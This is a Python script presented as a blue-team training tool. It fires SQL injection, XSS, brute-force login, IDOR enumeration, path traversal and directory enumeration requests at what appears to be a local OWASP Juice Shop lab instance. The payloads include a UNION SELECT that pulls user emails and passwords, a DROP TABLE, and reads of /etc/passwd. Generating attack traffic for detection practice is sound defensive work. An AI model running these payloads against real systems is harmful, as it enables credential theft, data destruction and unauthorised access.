#!/usr/bin/env python3
"""
Attack Simulator for Blue Team Training
Generates realistic attack traffic for detection practice
"""

import requests
import time
import random
import argparse
from concurrent.futures import ThreadPoolExecutor

class AttackSimulator:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Attack Simulator)'
    
    def sql_injection_login(self):
        """Simulate SQL injection on login"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "'; DROP TABLE Users--",
        ]
        
        for payload in payloads:
            try:
                self.session.post(f"{self.target}/rest/user/login", 
                    json={"email": payload, "password": "test"})
                time.sleep(0.5)
            except:
                pass
    
    def sql_injection_search(self):
        """Simulate SQL injection on search"""
        payloads = [
            "')) UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
            "')) OR 1=1--",
        ]
        
        for payload in payloads:
            try:
                self.session.get(f"{self.target}/rest/products/search", 
                    params={"q": payload})
                time.sleep(0.5)
            except:
                pass
    
    def xss_attacks(self):
        """Simulate XSS attacks"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
        ]
        
        for payload in payloads:
            try:
                self.session.get(f"{self.target}/rest/products/search", 
                    params={"q": payload})
                self.session.get(f"{self.target}/#/track-result", 
                    params={"id": payload})
                time.sleep(0.3)
            except:
                pass
    
    def brute_force_login(self, count=20):
        """Simulate brute force attack"""
        passwords = ["admin", "password", "123456", "admin123", "test", 
                     "root", "letmein", "welcome", "monkey", "dragon"]
        
        for i in range(count):
            try:
                self.session.post(f"{self.target}/rest/user/login",
                    json={"email": "admin@juice-sh.op", 
                          "password": random.choice(passwords)})
                time.sleep(0.2)
            except:
                pass
    
    def idor_enumeration(self):
        """Simulate IDOR attacks"""
        for i in range(1, 21):
            try:
                self.session.get(f"{self.target}/api/Users/{i}")
                self.session.get(f"{self.target}/rest/basket/{i}")
                time.sleep(0.3)
            except:
                pass
    
    def path_traversal(self):
        """Simulate path traversal"""
        payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
        ]
        
        for payload in payloads:
            try:
                self.session.get(f"{self.target}/ftp/{payload}")
                time.sleep(0.3)
            except:
                pass
    
    def directory_enumeration(self):
        """Simulate directory enumeration"""
        paths = ["/admin", "/administration", "/ftp", "/api-docs", 
                 "/swagger.json", "/backup", "/api/Users", "/rest/admin"]
        
        for path in paths:
            try:
                self.session.get(f"{self.target}{path}")
                time.sleep(0.2)
            except:
                pass
    
    def run_all_attacks(self):
        """Run complete attack simulation"""
        print("[*] Starting attack simulation...")
        
        print("[*] Phase 1: Reconnaissance")
        self.directory_enumeration()
        
        print("[*] Phase 2: SQL Injection")
        self.sql_injection_login()
        self.sql_injection_search()
        
        print("[*] Phase 3: XSS")
        self.xss_attacks()
        
        print("[*] Phase 4: Brute Force")
        self.brute_force_login()
        
        print("[*] Phase 5: IDOR")
        self.idor_enumeration()
        
        print("[*] Phase 6: Path Traversal")
        self.path_traversal()
        
        print("[+] Attack simulation complete!")


def main():
    parser = argparse.ArgumentParser(description="Attack Simulator for Blue Team Training")
    parser.add_argument("--target", default="http://localhost:8000", 
                        help="Target URL (default: http://localhost:8000)")
    parser.add_argument("--proxy", default="http://localhost:8080",
                        help="Proxy URL for logged traffic")
    parser.add_argument("--use-proxy", action="store_true",
                        help="Route traffic through proxy (for logging)")
    
    args = parser.parse_args()
    
    target = args.proxy if args.use_proxy else args.target
    
    print(f"""
    ╔═══════════════════════════════════════════╗
    ║     ATTACK SIMULATOR                      ║
    ║     Blue Team Training Tool               ║
    ╚═══════════════════════════════════════════╝
    
    Target: {target}
    """)
    
    simulator = AttackSimulator(target)
    simulator.run_all_attacks()


if __name__ == "__main__":
    main()
